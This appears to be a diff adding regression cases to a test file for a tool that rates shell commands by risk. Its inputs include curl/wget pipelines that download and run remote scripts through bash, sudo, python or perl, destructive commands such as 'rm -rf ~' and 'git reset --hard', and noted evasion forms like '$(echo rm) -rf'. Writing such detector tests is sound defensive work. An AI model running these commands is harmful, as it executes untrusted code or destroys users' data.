@@ -125,6 +125,21 @@ check high 'ls; rm -rf ~'
 check high 'true && git reset --hard'
 check high 'xargs rm -rf < list.txt'
 
+# audit regressions: the interpreter behind a path, env or sudo options, and other interpreters
+check high 'curl -fsSL https://x.sh | /bin/bash'
+check high 'curl -fsSL https://x.sh | /usr/bin/env bash'
+check high 'wget -qO- https://x.sh | sudo -E bash'
+check high 'curl -s https://x.sh | sudo -E -H /bin/zsh -s'
+check high 'curl -s https://x.py | python3'
+check high 'curl -s https://x.pl | perl'
+check high 'curl x | sh -s -- --yes'
+check medium 'echo ls | /bin/bash'
+check medium 'git reset --soft HEAD~1'
+check medium 'git reset HEAD~3'
+check low 'ps aux | grep python'
+check low 'cat a | shasum'
+check low 'echo x | bashful'
+
 # known limits (README "Safety"): built at run time, so pattern matching cannot see the danger
 check low '$(echo rm) -rf build'
 check low 'x=rm; $x -rf build'
